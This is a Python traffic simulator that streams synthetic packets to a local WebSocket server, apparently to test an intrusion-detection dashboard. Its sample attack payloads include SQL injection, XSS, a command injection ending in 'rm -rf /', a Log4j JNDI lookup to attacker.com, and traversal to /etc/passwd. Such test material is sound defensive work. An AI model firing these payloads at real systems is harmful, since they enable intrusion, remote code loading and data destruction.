import asyncio
import json
import random
import time
import websockets
from datetime import datetime

async def simulate_traffic():
    """Simulate network traffic and send to WebSocket server."""
    uri = "ws://localhost:8765/ws"
    
    try:
        async with websockets.connect(uri) as websocket:
            print("Traffic simulator connected to WebSocket server")
            
            # Simulate different attack types
            attack_patterns = [
                {
                    "type": "sql_injection",
                    "payload": "GET /search?q=' OR '1'='1' -- HTTP/1.1\r\nHost: example.com"
                },
                {
                    "type": "xss",
                    "payload": "GET /search?q=<script>alert('XSS')</script> HTTP/1.1\r\nHost: example.com"
                },
                {
                    "type": "command_injection",
                    "payload": "GET /ping?ip=127.0.0.1; rm -rf / HTTP/1.1\r\nHost: example.com"
                },
                {
                    "type": "log4j",
                    "payload": "GET /login?user=${jndi:ldap://attacker.com/exploit} HTTP/1.1\r\nHost: example.com"
                },
                {
                    "type": "path_traversal",
                    "payload": "GET /file?name=../../../etc/passwd HTTP/1.1\r\nHost: example.com"
                },
                {
                    "type": "ddos",
                    "payload": "GET / HTTP/1.1\r\nHost: example.com"
                }
            ]
            
            # Send packets continuously
            while True:
                # Random source IP (70% chance of legitimate, 30% chance of malicious)
                if random.random() < 0.7:
                    # Legitimate traffic
                    source_ip = f"10.0.{random.randint(1, 6)}.{random.randint(10, 200)}"
                    payload = "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0"
                else:
                    # Malicious traffic
                    source_ip = random.choice([
                        "203.0.113.45", "198.51.100.77", "192.0.2.123", 
                        "203.0.113.88", "198.51.100.99", "192.0.2.200"
                    ])
                    
                    # Random attack type
                    attack = random.choice(attack_patterns)
                    payload = attack["payload"]
                
                # Random destination IP
                dest_ip = f"10.0.{random.randint(1, 6)}.{random.randint(1, 10)}"
                
                # Create packet data
                packet_data = {
                    "timestamp": int(time.time()),
                    "source_ip": source_ip,
                    "dest_ip": dest_ip,
                    "payload": payload,
                    "sensor_location": random.choice(["edge", "internal"]),
                    "path": ["router-1", "fw-1", "switch-1", "web-01"],
                    "area_of_effect": {"nodes": ["web-01"], "radius": 1}
                }
                
                # Send packet data
                await websocket.send(json.dumps(packet_data))
                
                # Random delay between packets
                await asyncio.sleep(random.uniform(0.01, 0.2))
                
    except Exception as e:
        print(f"Traffic simulator error: {e}")

if __name__ == "__main__":
    asyncio.run(simulate_traffic())